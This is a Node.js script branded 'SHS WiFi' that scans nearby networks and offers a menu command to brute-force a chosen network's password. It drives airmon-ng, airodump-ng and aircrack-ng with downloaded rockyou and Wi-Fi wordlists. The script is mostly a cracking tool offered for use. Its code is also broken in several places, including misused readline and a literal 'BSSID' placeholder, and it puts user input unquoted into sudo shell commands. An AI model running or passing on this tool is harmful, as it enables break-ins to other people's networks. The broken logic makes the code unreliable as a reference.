const os = require('os');
const { execSync } = require('child_process');
const readline = require('readline');
const fs = require('fs');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

function clearTerminal() {
  if (os.platform() === 'win32') {
    execSync('cls');
  } else {
    execSync('clear');
  }
}

function downloadWordlist() {
  try {
    const wordlistUrlRockyou = "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt";
    const wordlistFilenameRockyou = "rockyou.txt";
    if (!fs.existsSync(wordlistFilenameRockyou)) {
      execSync(`wget -O ${wordlistFilenameRockyou} ${wordlistUrlRockyou}`);
      console.log("Wordlist (rockyou.txt) downloaded successfully!");
    } else {
      console.log("Wordlist (rockyou.txt) already exists.");
    }

    const wordlistUrlNew = "https://github.com/Mysteriza/WiFi-Password-Wordlist/raw/main/wifite.txt";
    const wordlistFilenameNew = "wifite.txt";
    if (!fs.existsSync(wordlistFilenameNew)) {
      execSync(`wget -O ${wordlistFilenameNew} ${wordlistUrlNew}`);
      console.log("New wordlist (wifite.txt) downloaded successfully!");
    } else {
      console.log("New wordlist (wifite.txt) already exists.");
    }
  } catch (error) {
    console.error("Error downloading wordlists:", error);
  }
}

async function bruteforceWifi(ssid) {
  try {
    await execSync('sudo airmon-ng start wlan0');
    await execSync('sudo airmon-ng start wlan0mon');
    await execSync('sudo wash -i wlan0mon');
    await execSync('sudo airmon-ng stop wlan0mon');
    await execSync('sudo airmon-ng stop wlan0');
    await execSync(`sudo airodump-ng -w output --essid ${ssid} wlan0mon`);
    await execSync('sudo aircrack-ng -w rockyou.txt -w wifite.txt -b BSSID output.cap');
    console.log("Bruteforcing WiFi:", ssid);
  } catch (error) {
    console.error("Error bruteforcing WiFi:", error);
  }
}

function scanWifi() {
  try {
    const result = execSync('sudo iwlist wlan0 scan', { encoding: 'utf-8' });
    const output = result.trim();
    const networks = [];
    let currentNetwork = {};

    output.split('\n').forEach(line => {
      if (line.includes("Cell")) {
        if (Object.keys(currentNetwork).length !== 0) {
          networks.push(currentNetwork);
          currentNetwork = {};
        }
        currentNetwork["BSSID"] = line.split("Address: ")[1];
      } else if (line.includes("ESSID")) {
        currentNetwork["SSID"] = line.split("ESSID:")[1].replace(/"/g, '').trim();
      } else if (line.includes("Quality")) {
        currentNetwork["Quality"] = line.split("Quality=")[1].split(" ")[0];
        currentNetwork["Signal Level"] = line.split("Signal level=")[1].split(" ")[0];
      } else if (line.includes("Encryption key")) {
        currentNetwork["Encryption"] = line.includes("on") ? "Yes" : "No";
      }
    });

    console.log("Scanned WiFi networks:");
    networks.forEach(network => {
      console.log("SSID:", network.SSID || "Unknown");
      console.log("BSSID:", network.BSSID || "Unknown");
      console.log("Quality:", network.Quality || "Unknown");
      console.log("Signal Level:", network["Signal Level"] || "Unknown");
      console.log("Encryption:", network.Encryption || "Unknown");
      console.log("-------------------------------");
    });
  } catch (error) {
    console.error("Error scanning WiFi:", error);
  }
}

async function connectWifi(ssid, password) {
  try {
    await execSync(`sudo nmcli device wifi connect ${ssid} password ${password}`);
    console.log("Connected to WiFi network:", ssid);
  } catch (error) {
    console.error("Error connecting to WiFi:", error);
  }
}

function login() {
  clearTerminal();
  const usn = rl.question("🚀 USN > ");
  const psw = rl.question("🚀 PSW > ");
  if (usn === "admin" && psw === "root") {
    main();
  } else {
    console.log("Nice try kid 🚀");
    process.exit();
  }
}

function main() {
  clearTerminal();
  downloadWordlist();

  const menu = `
    █████████████████
    █─▄▄▄▄█─█─█─▄▄▄▄█
    █▄▄▄▄─█─▄─█▄▄▄▄─█
    ▀▄▄▄▄▄▀▄▀▄▀▄▄▄▄▄▀      

    [scan] Scan WiFi Networks
    [bruteforce] Bruteforce WiFi
    [connect] Connect to WiFi
    [usage] Guide command.
    [exit] Exit

    --- SHS WiFi ---
  `;

  console.log(menu);

  if (process.argv.length > 2 && process.argv[2].toLowerCase() === "bruteforce") {
    const ssid = process.argv[3];
    bruteforceWifi(ssid);
    return;
  }

  rl.on('line', (input) => {
    const command = input.trim().toLowerCase();
    switch (command) {
      case "scan":
        scanWifi();
        break;
      case "bruteforce":
        const ssid = input.split(" ")[1];
        bruteforceWifi(ssid);
        break;
      case "connect":
        const [targetSsid, password] = input.split(" ")[1].split(":");
        connectWifi(targetSsid, password);
        break;
      case "usage":
        console.log("--- Usage ---");
        console.log("  [scan] Just like that, no additional commands");
        console.log("  [bruteforce] with target ssid > (bruteforce targetssid)");
        console.log("  [connect] with ssid and password separated by ':' > (connect targetssid:password12345)");
        console.log("\n  Make sure to install networkmanager, aircrack-ng, airmon-ng, airdump-ng and pywifi. Also, you cannot use this script in termux (even if you're rooted). If you have a laptop/computer/Chromebook (ChromeOS), use that.");
        break;
      case "exit":
        process.exit();
      default:
        console.log("Invalid command. Please try again.");
        break;
    }
  });
}

login();
